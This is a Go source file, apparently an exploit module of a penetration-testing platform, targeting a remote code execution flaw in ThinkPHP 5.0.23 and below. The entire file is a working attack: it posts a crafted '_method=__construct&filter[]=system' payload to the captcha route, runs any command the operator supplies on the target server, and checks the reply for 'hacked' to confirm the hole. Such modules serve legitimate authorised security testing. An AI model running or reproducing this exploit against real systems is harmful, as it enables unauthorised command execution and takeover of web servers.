package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"pentestplatform/logger"
	"strings"
)

type AttackerOptions struct {
	Target string `json:"target"`
	Cmd string `json:"cmd"`
}

type tp5_0_23RCE struct {
	options AttackerOptions
}

func (t *tp5_0_23RCE) Exploit()(string, bool){
	url := t.options.Target + "/index.php?s=captcha"
	var payload string
	if t.options.Cmd == ""{
		payload = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo \"hacked\""
	}else {
		payload = fmt.Sprintf("_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%s", t.options.Cmd)
	}
	resp, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(payload))
	if err != nil{
		logger.Red.Println(err)
	}
	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	if t.options.Cmd == ""{
		return string(bodyBytes), t.IsVulnerable(string(bodyBytes))
	}else{
		return string(bodyBytes), true
	}
}

func (t *tp5_0_23RCE) GetDesc()string{
	return "在Thinkphp 5.0.23以下可以通过发起HTTP请求达到RCE的攻击效果"
}

func (t *tp5_0_23RCE) GetTitle()string{
	return "Thinkphp 5.0.23 远程代码执行漏洞"
}

func (t tp5_0_23RCE) GetVulnType()string{
	return "RCE"
}

func (t *tp5_0_23RCE) GetOptions()string{
	optionsJson, err := json.Marshal(t.options)
	if err != nil{
		return err.Error()
	}
	return string(optionsJson)
}

func (t *tp5_0_23RCE) SetOptions(optionJson string){
	var attOptions AttackerOptions
	err := json.Unmarshal([]byte(optionJson), &attOptions)
	t.options = attOptions
	if err != nil{
		logger.Red.Println(err)
	}
}

func (t *tp5_0_23RCE) IsVulnerable(v ...interface{})bool{
	if strings.Contains(v[0].(string), "hacked"){
		return true
	}else{
		return false
	}
}

var FAttacker tp5_0_23RCE
